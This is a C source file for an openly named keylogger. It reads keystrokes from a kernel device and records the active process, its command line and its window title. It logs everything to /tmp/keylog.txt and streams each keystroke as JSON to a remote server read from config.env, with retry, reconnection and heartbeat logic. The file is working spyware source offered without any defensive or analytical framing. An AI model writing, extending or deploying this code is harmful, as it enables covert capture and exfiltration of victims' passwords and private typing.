#include <stdio.h>
#include <signal.h>
#include <stdbool.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include "device_client.h"
#include "logger.h"
#include "network_client.h"
#include "keymap.h"
#include "process_tracker.h"

#define MAX_RETRY_COUNT 3
#define RETRY_DELAY_MS 1000
#define HEARTBEAT_INTERVAL 30  // Send heartbeat every 30 seconds

static volatile bool running = true;
static struct process_info current_process = {0};
static time_t last_heartbeat = 0;
static bool network_connected = false;

void handle_sigint(int sig) {
    (void)sig;
    running = false;
    printf("\nExiting program...\n");
}

// Get current timestamp in ISO 8601 format
static void get_timestamp(char *timestamp, size_t size) {
    time_t now = time(NULL);
    struct tm *tm_info = localtime(&now);
    strftime(timestamp, size, "%Y-%m-%dT%H:%M:%S%z", tm_info);
}

// Escape JSON string (handle quotes, backslashes, etc.)
static void escape_json_string(const char *input, char *output, size_t output_size) {
    size_t j = 0;
    for (size_t i = 0; input[i] != '\0' && j < output_size - 1; i++) {
        switch (input[i]) {
            case '"':
                if (j + 2 < output_size) {
                    output[j++] = '\\';
                    output[j++] = '"';
                }
                break;
            case '\\':
                if (j + 2 < output_size) {
                    output[j++] = '\\';
                    output[j++] = '\\';
                }
                break;
            case '\n':
                if (j + 2 < output_size) {
                    output[j++] = '\\';
                    output[j++] = 'n';
                }
                break;
            case '\r':
                if (j + 2 < output_size) {
                    output[j++] = '\\';
                    output[j++] = 'r';
                }
                break;
            case '\t':
                if (j + 2 < output_size) {
                    output[j++] = '\\';
                    output[j++] = 't';
                }
                break;
            default:
                output[j++] = input[i];
                break;
        }
    }
    output[j] = '\0';
}

// Send data to server with retry mechanism
static int send_to_server_with_retry(const char *data, size_t len) {
    if (!network_connected) {
        return -1;
    }
    
    int retry_count = 0;
    while (retry_count < MAX_RETRY_COUNT) {
        int result = network_client_send(data, len);
        if (result >= 0) {
            return result;  // Success
        }
        
        retry_count++;
        if (retry_count < MAX_RETRY_COUNT) {
            printf("Failed to send data, retrying in %d ms... (attempt %d/%d)\n", 
                   RETRY_DELAY_MS, retry_count, MAX_RETRY_COUNT);
            usleep(RETRY_DELAY_MS * 1000);
        }
    }
    
    printf("Failed to send data after %d attempts\n", MAX_RETRY_COUNT);
    network_connected = false;  // Mark as disconnected
    return -1;
}

// Send heartbeat to keep connection alive
static void send_heartbeat(void) {
    time_t now = time(NULL);
    if (now - last_heartbeat >= HEARTBEAT_INTERVAL) {
        char timestamp[64];
        get_timestamp(timestamp, sizeof(timestamp));
        
        char escaped_process[512];
        escape_json_string(current_process.name, escaped_process, sizeof(escaped_process));
        
        char heartbeat_msg[512];
        snprintf(heartbeat_msg, sizeof(heartbeat_msg), 
                "{\"type\":\"heartbeat\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\"}\n",
                timestamp, current_process.pid, escaped_process);
        
        if (send_to_server_with_retry(heartbeat_msg, strlen(heartbeat_msg)) >= 0) {
            last_heartbeat = now;
        }
    }
}

// Try to reconnect to server
static bool try_reconnect(void) {
    printf("Attempting to reconnect to server...\n");
    network_client_cleanup();
    
    // Try to initialize network client
    if (network_client_init("config.env") < 0) {
        if (network_client_init("user/config.env") < 0) {
            printf("Failed to reconnect to server\n");
            return false;
        }
    }
    
    network_connected = true;
    last_heartbeat = time(NULL);
    printf("Successfully reconnected to server\n");
    return true;
}

int main(void) {
    char buf[1024];
    signal(SIGINT, handle_sigint);

    // Initialize process tracker
    if (process_tracker_init() < 0) {
        fprintf(stderr, "Failed to initialize process tracker\n");
        return 1;
    }

    // Initialize network client
    if (network_client_init("config.env") < 0) {
        if (network_client_init("user/config.env") < 0) {
            fprintf(stderr, "Failed to initialize network client\n");
            // Continue without network - log locally only
            network_connected = false;
        } else {
            network_connected = true;
            last_heartbeat = time(NULL);
        }
    } else {
        network_connected = true;
        last_heartbeat = time(NULL);
    }

    // Initialize device client
    if (device_client_init("/dev/keylogger") < 0) {
        fprintf(stderr, "Failed to initialize device client\n");
        process_tracker_cleanup();
        if (network_connected) {
            network_client_cleanup();
        }
        return 1;
    }

    if (logger_open("/tmp/keylog.txt") < 0) {
        fprintf(stderr, "Failed to open log file\n");
        device_client_cleanup();
        process_tracker_cleanup();
        if (network_connected) {
            network_client_cleanup();
        }
        return 1;
    }

    printf("Keylogger started. Reading from /dev/keylogger\n");
    if (network_connected) {
        printf("Network client connected to server\n");
    } else {
        printf("Network client disabled - logging locally only\n");
    }

    // Get initial process info
    if (process_tracker_get_active_process(&current_process) == 0) {
        printf("Initial process: PID=%d, Name=%s, Window=%s\n", 
               current_process.pid, current_process.name, current_process.window_title);
        
        // Send initial process info to server
        if (network_connected) {
            char timestamp[64];
            get_timestamp(timestamp, sizeof(timestamp));
            
            char escaped_name[512], escaped_cmd[1024], escaped_window[512];
            escape_json_string(current_process.name, escaped_name, sizeof(escaped_name));
            escape_json_string(current_process.cmdline, escaped_cmd, sizeof(escaped_cmd));
            escape_json_string(current_process.window_title, escaped_window, sizeof(escaped_window));
            
            char initial_process_msg[4096];
            snprintf(initial_process_msg, sizeof(initial_process_msg), 
                    "{\"type\":\"initial_process\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\",\"command\":\"%s\",\"window\":\"%s\"}\n",
                    timestamp, current_process.pid, escaped_name, escaped_cmd, escaped_window);
            
            send_to_server_with_retry(initial_process_msg, strlen(initial_process_msg));
        }
    }

    while (running) {
        // Check if process has changed (check more frequently for better responsiveness)
        static int check_counter = 0;
        check_counter++;
        
        if (check_counter >= 5) {
            check_counter = 0;
            if (process_tracker_has_changed()) {
                if (process_tracker_get_active_process(&current_process) == 0) {
                    printf("=== PROCESS CHANGE ===\n");
                    printf("New active process: PID=%d, Name=%s\n", 
                           current_process.pid, current_process.name);
                    printf("Command: %s\n", current_process.cmdline);
                    printf("Window: %s\n", current_process.window_title);
                    printf("=====================\n");
                    
                    // Log process change locally (keep old format for local logs)
                    char process_log[2048];
                    char timestamp[64];
                    get_timestamp(timestamp, sizeof(timestamp));
                    
                    snprintf(process_log, sizeof(process_log), 
                            "[PROCESS_CHANGE] PID=%d, Name=%s, Cmd=%s, Window=%s, Timestamp=%s\n",
                            current_process.pid, current_process.name, 
                            current_process.cmdline, current_process.window_title, timestamp);
                    logger_write(process_log);
                    
                    // Send process change notification to server (JSON format)
                    if (network_connected) {
                        char escaped_name[512], escaped_cmd[1024], escaped_window[512];
                        escape_json_string(current_process.name, escaped_name, sizeof(escaped_name));
                        escape_json_string(current_process.cmdline, escaped_cmd, sizeof(escaped_cmd));
                        escape_json_string(current_process.window_title, escaped_window, sizeof(escaped_window));
                        
                        char process_change_json[4096];
                        snprintf(process_change_json, sizeof(process_change_json), 
                                "{\"type\":\"process_change\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\",\"command\":\"%s\",\"window\":\"%s\"}\n",
                                timestamp, current_process.pid, escaped_name, escaped_cmd, escaped_window);
                        
                        if (send_to_server_with_retry(process_change_json, strlen(process_change_json)) < 0) {
                            // Try to reconnect if send failed
                            if (!try_reconnect()) {
                                printf("Warning: Could not reconnect to server\n");
                            }
                        }
                    }
                }
            }
        }

        int len = device_client_read(buf, sizeof(buf));
        if (len > 0) {
            buf[len] = '\0'; 
            
            // Create metadata with process info
            char output[4096];
            char timestamp[64];
            get_timestamp(timestamp, sizeof(timestamp));
            
            // Local log (keep old format)
            snprintf(output, sizeof(output), 
                    "[KEYSTROKE] PID=%d, Process=%s, Window=%s, Data=%s, Timestamp=%s\n",
                    current_process.pid, current_process.name, 
                    current_process.window_title, buf, timestamp);
            
            printf("Received: %s", output);
            logger_write(output);

            // Send to server (JSON format)
            if (network_connected) {
                char escaped_process[512], escaped_window[512], escaped_data[256];
                escape_json_string(current_process.name, escaped_process, sizeof(escaped_process));
                escape_json_string(current_process.window_title, escaped_window, sizeof(escaped_window));
                escape_json_string(buf, escaped_data, sizeof(escaped_data));
                
                char keystroke_json[4096];
                snprintf(keystroke_json, sizeof(keystroke_json), 
                        "{\"type\":\"keystroke\",\"timestamp\":\"%s\",\"pid\":%d,\"process\":\"%s\",\"window\":\"%s\",\"data\":\"%s\"}\n",
                        timestamp, current_process.pid, escaped_process, escaped_window, escaped_data);
                
                if (send_to_server_with_retry(keystroke_json, strlen(keystroke_json)) < 0) {
                    // Try to reconnect if send failed
                    if (!try_reconnect()) {
                        printf("Warning: Could not reconnect to server\n");
                    }
                }
            }

            fflush(stdout);
        } else if (len == 0) {
            usleep(10000); 
        }
        
        // Send heartbeat periodically
        if (network_connected) {
            send_heartbeat();
        }
    }
    
    // Send shutdown notification
    if (network_connected) {
        char timestamp[64];
        get_timestamp(timestamp, sizeof(timestamp));
        
        char shutdown_msg[256];
        snprintf(shutdown_msg, sizeof(shutdown_msg), 
                "{\"type\":\"shutdown\",\"timestamp\":\"%s\"}\n", timestamp);
        send_to_server_with_retry(shutdown_msg, strlen(shutdown_msg));
    }
    
    logger_close();
    device_client_cleanup();
    process_tracker_cleanup();
    if (network_connected) {
        network_client_cleanup();
    }
    return 0;
} 